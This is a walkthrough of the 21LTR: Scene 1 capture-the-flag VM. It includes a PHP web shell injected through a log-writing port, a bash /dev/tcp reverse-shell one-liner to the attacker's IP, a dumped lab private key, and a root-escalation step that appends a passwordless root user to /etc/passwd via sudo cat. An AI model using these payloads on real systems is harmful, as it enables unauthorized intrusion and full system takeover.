<br /><i>21LTR: Scene 1 VM can be downloaded <a href="https://www.vulnhub.com/entry/21ltr-scene-1,3/">here<span id="goog_337929613"></span><span id="goog_337929614"></span></a>. Had to use a couple of hints to proceed.</i><br /><h2>0. Get VMs IP</h2>Not needed, VM has a static IP. You might need to change your VirtualBox/VMware settings to get on the right subnet (192.168.2.0/24), I followed <a href="https://pubs.vmware.com/workstation-9/index.jsp?topic=%2Fcom.vmware.ws.using.doc%2FGUID-AF4C4227-2499-440B-A297-A4097A5C94AA.html">this</a>.<br /><span style="color: black; font-style: italic;"> </span> <br /><h2>1. Enumeration&nbsp;</h2><h4>TCP Ports enumeration&nbsp;</h4><h4>&nbsp;</h4><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~#</span> nmap -sV 192.168.2.120<br /><br /><span style="color: #888888;">Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-26 15:01 EDT<br />Nmap scan report for 192.168.2.120<br />Host is up (0.00011s latency).<br />Not shown: 65531 closed ports<br />PORT      STATE SERVICE     VERSION<br />21/tcp    open  ftp         ProFTPD 1.3.1<br />22/tcp    open  ssh         OpenSSH 5.1 (protocol 1.99)<br />80/tcp    open  http        Apache httpd 2.2.13 ((Unix) DAV/2 PHP/5.2.10)<br />10001/tcp open  scp-config?<br />MAC Address: 00:0C:29:00:00:B3 (VMware)<br />Service Info: OS: Unix<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds</span><br /></pre></div><h2>&nbsp;</h2><h2>2. Web server </h2>Checking the sourcecode reveals credentials for user "logs":<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #0099ff; font-style: italic;">&lt;!-- username:logs password:zg]E-b0]+8:(58G --&gt;</span><br /></pre></div><br />Using the creds to SSH into the server didn't work, it did work for the FTP server running though. Logs is very likely to be a virtual user. Worth noting is that our FTP working directory is mapped to <b>"/"</b> (you can check that with <b>pwd </b>command) and only a single php file is found, using <b>get backup_log.php</b> will download the file into our local directory.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">root@kali:/tmp# cat backup_log.php <br /><span style="color: #330099; font-weight: bold;">&lt;html&gt;</span>                                                                                                                      <br />        <span style="color: #330099; font-weight: bold;">&lt;head&gt;</span><br />                <span style="color: #330099; font-weight: bold;">&lt;title&gt;&lt;/title&gt;</span><br />        <span style="color: #330099; font-weight: bold;">&lt;/head&gt;</span>                <br />        <span style="color: #330099; font-weight: bold;">&lt;body&gt;</span> <br />                <span style="color: #330099; font-weight: bold;">&lt;h2</span> <span style="color: #330099;">style=</span><span style="color: #cc3300;">"text-align: center"</span><span style="color: #330099; font-weight: bold;">&gt;</span><br />                        Intranet Dev Server Backup Log<span style="color: #330099; font-weight: bold;">&lt;/h2&gt;</span><br />                        <span style="color: #009999;">&lt;?php $log = time(); echo '&lt;center&gt;&lt;b&gt;GMT time is: '.gmdate('r', $log).'&lt;/b&gt;&lt;/center&gt;'; ?&gt;</span>          <br />                <span style="color: #330099; font-weight: bold;">&lt;p&gt;</span>                                                                                                         <br />                        <span style="color: #999999; font-weight: bold;">&amp;nbsp;</span><span style="color: #330099; font-weight: bold;">&lt;/p&gt;</span>             <br />                <span style="color: #330099; font-weight: bold;">&lt;h4&gt;</span>                           <br />                        Backup Errors:<span style="color: #330099; font-weight: bold;">&lt;/h4&gt;</span><br />                <span style="color: #330099; font-weight: bold;">&lt;p&gt;</span>                        <br />                        <span style="color: #999999; font-weight: bold;">&amp;nbsp;</span><span style="color: #330099; font-weight: bold;">&lt;/p&gt;</span>         <br />        <span style="color: #330099; font-weight: bold;">&lt;/body&gt;</span>                            <br /><span style="color: #330099; font-weight: bold;">&lt;/html&gt;</span><br /><br />Wed, 03 Jan 2012 09:51:42 +0000 from 192.168.2.240: Permission denied<br /><span style="color: #330099; font-weight: bold;">&lt;br&gt;&lt;br&gt;</span><br />Thu, 04 Jan 2012 13:11:29 +0000 from 192.168.2.240: No Such file or directory<br /><span style="color: #330099; font-weight: bold;">&lt;br&gt;&lt;br&gt;</span><br />Thu, 04 Jan 2012 13:31:36 +0000 from 192.168.2.240: No space left on device<br /><span style="color: #330099; font-weight: bold;">&lt;br&gt;&lt;br&gt;</span><br />Thu, 04 Jan 2012 13:41:36 +0000 from 192.168.2.240: No Space left on device<br /><span style="color: #330099; font-weight: bold;">&lt;br&gt;&lt;br&gt;</span><br />Mon, 16 Feb 2012 17:01:02 +0000 from 192.168.2.240: No Space left on device<br /><span style="color: #330099; font-weight: bold;">&lt;br&gt;&lt;br&gt;</span><br />Fri, 23 Apr 2012 10:51:07 +0000 from 192.168.2.240: No Space left on device<br /><span style="color: #330099; font-weight: bold;">&lt;br&gt;&lt;br&gt;</span><br />Fri, 12 May 2012 16:41:32 +0000 from 192.168.2.240: No Space Left on device<br /><span style="color: #330099; font-weight: bold;">&lt;br&gt;&lt;br&gt;</span><br />GET / HTTP/1.0<br /></pre></div><br />Dirbuster reveals there's a /logs/ directory, which contains the file we just found (/logs/ returns a 4xx, so you need to manually append the file name).<br /><br />I poked around and didn't find anything of use, but the logs do show that a specific IP tried to access the box, why don't we try changing our IP to it?<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:/tmp#</span> ifconfig eth0 192.168.2.240 netmask 255.255.255.0<br /><span style="color: #000099; font-weight: bold;">root@kali:/tmp#</span> ifconfig<br /><span style="color: #aaaaaa;">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br /><span style="color: #aaaaaa;">        inet <b>192.168.2.240</b>  netmask 255.255.255.0  broadcast 192.168.2.255</span><br /><span style="color: #aaaaaa;">        inet6 fe80::20c:29ff:fe77:ef24  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br /><span style="color: #aaaaaa;">        ether 00:0c:29:77:ef:24  txqueuelen 1000  (Ethernet)</span><br /><span style="color: #aaaaaa;">        RX packets 500271  bytes 63946744 (60.9 MiB)</span><br /><span style="color: #aaaaaa;">        RX errors 0  dropped 0  overruns 0  frame 0</span><br /><span style="color: #aaaaaa;">        TX packets 571896  bytes 49438370 (47.1 MiB)</span><br /><span style="color: #aaaaaa;">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br /><span style="color: #aaaaaa;">        device interrupt 19  base 0x2024  </span><br /></pre></div><br />At this point I got stuck, and had to check a walkthrough for tips. While scrolling down carefully, they mentioned using wireshark and just listening for a while. The server attempted to connect to port 10000 and gives a whole lot of garbled data. Waited another 5 minutes and made sure this time to store the data. It was a gzip file, decompressing it revealed lots of files, but it's still suspicious how to use it next.<br /><br />From time to time I noticed that port 10001 opens up (noticed it at the very start), when I found it open I wrote some stuff into it then hit CTRL+C. Nothing happened! But then I checked the backup_log.php file again, <b>it was blank</b>. I believe there's a bug with the code, but ultimately I had to restart the VM and this time when I wrote some text I waited till the port time out. Refreshing the php file shows our output as well as executes any php code embedded.<br /><br /><i>(Oh and by the way, this seems to happen after the server tries to contact us on port 10000.)</i><br /><br />Text used:<br /><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~/Desktop#</span> cat text<br /><span style="color: #aaaaaa;">It's me, abatchy</span><br /><span style="color: #aaaaaa;">&lt;?php system($_GET['cmd']) ?&gt;</span>&nbsp;</pre><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~/Desktop#</span> <span style="color: #aaaaaa;">nc -nvlp 10000 &gt; file.gz &amp;&amp; nc -nv 192.168.2.120 10001 &lt; text</span><span style="color: #aaaaaa;"><br />listening on [any] 10000 ...<br />connect to [192.168.2.240] from (UNKNOWN) [192.168.2.120] 49182<br />(UNKNOWN) [192.168.2.120] 10001 (?) open</span>&nbsp;</pre><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~/Desktop#</span> <span style="color: #aaaaaa;">curl http://192.168.2.120/logs/backup_log.php?cmd=whoami</span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: #aaaaaa;">... </span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: #aaaaaa;">&lt;redacted&gt; </span><span style="color: #aaaaaa;"><br /></span><span style="color: #999999;">...</span></pre><pre style="line-height: 125%; margin: 0;">It's me, abatchy apache &nbsp;</pre></div><br />Awesome, let's try a bash one-liner to get a reverse shell. First start a listener on port 443.<br /><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;"><span style="color: #000099; font-weight: bold;">------------------------------</span>Terminal 1------------------------------ </span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~/Desktop#</span> nc -nvlp 443<br /><span style="color: #aaaaaa;">listening on [any] 443 ...</span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;"><span style="color: #000099; font-weight: bold;">------------------------------</span>Terminal 2------------------------------ </span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;"><span style="color: #aaaaaa;"><span style="color: #073763;"><span style="color: blue;"><span style="color: #000099; font-weight: bold;">root@kali:~/Desktop#</span></span></span> curl "http://192.168.2.120/logs/backup_log.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.240%2F443%200%3E%261"</span></span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;"><span style="color: #000099; font-weight: bold;">------------------------------</span>Terminal 1------------------------------&nbsp;</span></pre><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~/Desktop#</span> nc -nvlp 443<br /><span style="color: #aaaaaa;">listening on [any] 443 ...<br />connect to [192.168.2.240] from (UNKNOWN) [192.168.2.120] 42663<br />bash: no job control in this shell<br /><span style="color: blue;">bash-3.1$</span> hostname<br />slax<br /><span style="color: blue;"><span style="color: #aaaaaa;"><span style="color: blue;">bash-3.1$ </span>tail /etc/passwd<br />sshd:x:33:33:sshd:/:/bin/false<br />gdm:x:42:42:GDM:/var/state/gdm:/bin/bash<br />apache:x:80:80:User for Apache:/srv/httpd:/bin/false<br />messagebus:x:81:81:User for D-BUS:/var/run/dbus:/bin/false<br />haldaemon:x:82:82:User for HAL:/var/run/hald:/bin/false<br />pop:x:90:90:POP:/:/bin/false<br />nobody:x:99:99:nobody:/:/bin/false<br />hbeale:x:1001:10:,,,:/home/hbeale:/bin/bash<br />jgreen:x:1002:10:,,,:/home/jgreen:/bin/bash<br />logs:x:1003:100:,,,:/tmp:/bin/bash<br /><span style="color: blue;">bash-3.1$</span> </span></span></span></pre></div><br />After some poking around I found a directory containing an RSA key.<br /><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #aaaaaa;"><span style="color: blue;">bash-3.1$</span> <span style="color: black;">ls -al</span><br />total 8<br />drwxrwxrwx 2 root root   80 Jun  6  2012 .<br />drwxrwxrwx 3 root root   80 Jun 19  2012 ..<br />-rwxrwxrwx 1 root root  393 Jun  2  2012 authorized_keys<br />-rwxrwxrwx 1 root root 1675 Jan  5  2008 id_rsa<br /><span style="color: blue;">bash-3.1$</span> <span style="color: black;">pwd</span><br />/media/USB_1/Stuff/Keys<br /><span style="color: blue;">bash-3.1$</span> <span style="color: black;">cat id_rsa</span><br />-----BEGIN RSA PRIVATE KEY-----<br />MIIEoQIBAAKCAQEA1pfb/CVukUw4Xe67YLEZzVHWNax0zJjI1CfcsoEGylmmtlA6<br />iXHi41nLshzXu9n536JfM9LFAWGqefBVX7Bzd/fC4+jHS3q89IK9FP7gFPwEmlNH<br />CwPX0ADxDFyB1lJOFffJ9gVw3VgHCaCPgS70UqJD0hZFDMSDMoBa91PylFQR0m58<br />nMq8DsGRbeC5hTdpLXKfBuW8v/lFuNEWVWNcZDie82aiJg8WRUUIrzeGZSR3+cG1<br />hi6za67VIi+ce8fFuBvIgaEpvJ0JSIX7zPLUV10ezW1NQRNplKSam3TIYI3+Ywuh<br />lcgpEyliHYReN6v91+um2c6LNy9y/vx2Akci5QIBIwKCAQEAvhF5s3GcchBPLqA/<br />kCfVBk/MW2zcerM1iLWXlsoNVCOFB+Co4CMKyV4pcd8IOKsfJSlqQ9fwUa5GiUKU<br />wne2urbf0S1CzdMcY4m9al4W7gPJkACeAnEeO+OTq9zoBvhxDCSc79ju7+7hqXD0<br />IfZjXyIBjjD7VHOKJWpfMtVTMunBCMqoAMa2veuN6LgDJweQNi7kon4qcj4SghGI<br />bdBv/Cnk7PMkG+DhafTRWyXGMWFpTHV4BNKv0i+k4lVV1oP9nJnh9jglY4EkD9LD<br />0Yt2QZt+XMTlxScsjcBpVGc9m4ZrgmRZGV0PTyMuWJtURkDBYPizkiPjjSZfUbyZ<br />y9QECwKBgQDsR9wLzrQbJIaOX8dG4rEt8pQHdYK7KCM8Bcq45iKKPzeLxchguM3o<br />+y9nRz5x8RWXWZUMl7PldoqwmrKh6WVCrdJ7mghPTYx3Djhcaf8q5XFTUhZH4xhB<br />72g1H6+JCECUjAFfjoSTOEswCFKYssgYA22x3fvLGg3S8f0UjjE1xQKBgQDogKVg<br />iyXCE833evccfrd/otsyVcxNincunAtYDAsqa2ZrjXL3oFwNwfC1CVKPhqDlnG46<br />M1tiSeYXygPbuPbHzRdu0ZuG7jRxxVdndl52gq/Zt8MKNRD9mdbFRcRMXmMRfaE4<br />RXdry9eB4rPywfWgJPGNVtOFZP6PRVv+IpoqoQKBgBRArHYKZzWGybRunA1j400U<br />ytwRYvoZYhsWcHY/nI+Bwu65Lm6wwTE6GgGJw4Yb+olQ0kLoboFh7qFsWHRHNJCv<br />0DZ66sT4BLm/Y+qp/+275SRmHyq7sZ9AaASNr/XNgeDYzOru9Wu0XjdRK6awPQlf<br />YSyAvc+UhNeRFbFOBDfPAoGAVlurI9vpc/i6N1mO+/SNTKo0KKOGZfGZ+16H3t/m<br />496/pEp7KMaIl2VKxuY0m7WpedsEXsKeSRQiQ1mpqWH1QuXG4AS2HCyXIvGG3Uk5<br />B3JekrH3/HocQO//UJZBmLVX/y6pmI7UlcC9wodnaMuzAPfHbwL+G5qKb7qtI+D3<br />busCgYATj4y+8msxNWRRNbHWAV7G0OurPDeZJ8F8NDLpM22X8fM08wgGRwkW4fpa<br />A+J8tN2ibiDqw29W6Rc1/4evAPbo3GR932W/ELOTOpP2yquiwoSxPG+HCLHmDITr<br />1qGHJRSOiFzo99iS5aQRhUvdl3M0lz1Cort7hjRKUkSWcT02Rw==<br />-----END RSA PRIVATE KEY-----</span><span style="color: #aaaaaa;"><br />&nbsp;</span></pre></div><br />I copied it over and set the right permissions:<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~/Desktop#</span> chmod 600 key<br /><span style="color: navy; font-weight: bold;">root@kali:~/Desktop#</span> ssh -i key hbeale@192.168.2.120<br /><span style="color: #888888;">Linux 2.6.27.27.</span><br /><span style="color: navy; font-weight: bold;">hbeale@slax:~$</span> whoami<br /><span style="color: #888888;">hbeale</span><br /></pre></div><br />Nice. First thing I always try on a low priv is <b>sudo -l.</b><br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~/Desktop# <span style="color: black;">ssh -i key hbeale@192.168.2.120</span><br /><span style="color: #444444;">Linux 2.6.27.27.</span><br />hbeale@slax:~$ <span style="color: black;">whoami</span><br /><span style="color: #444444;">hbeale</span><br />hbeale@slax:~$ <span style="color: black;">sudo -l</span><br /><span style="color: #444444;">User hbeale may run the following commands on this host:<br />    (root) NOEXEC: /bin/ls, (root) /usr/bin/cat, (root) /usr/bin/more, (root)<br />    !/usr/bin/su *root*<br />    (root) NOPASSWD: /usr/bin/cat</span></span><br /></pre></div><br />Awesome, we can edit files with cat using the &gt;&gt; operator. Let's add a root user.<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: blue;">hbeale@slax:~$</span> sudo /usr/bin/cat &gt;&gt; /etc/passwd<br /><span style="color: #444444;">abatchy::0:0::/root:/bin/bash</span><br />^C<br /><span style="color: blue;">hbeale@slax:~$</span> su abatchy<br /><span style="color: blue;">root@slax:/home/hbeale#</span> id</pre><pre style="line-height: 125%; margin: 0;">uid=0(root) gid=0(root) groups=0(root) </pre></div><br />Voila, we got root.<br /><br /><h4><span style="font-weight: normal;">Note: Not sure if the author did it on purpose to just write some input to port 10001 and discover it's written to the php file or not, please leave a comment if you got an answer to that.</span></h4><h4><span style="font-weight: normal;">&nbsp;</span></h4><h4><span style="font-weight: normal;">Abatchy </span></h4>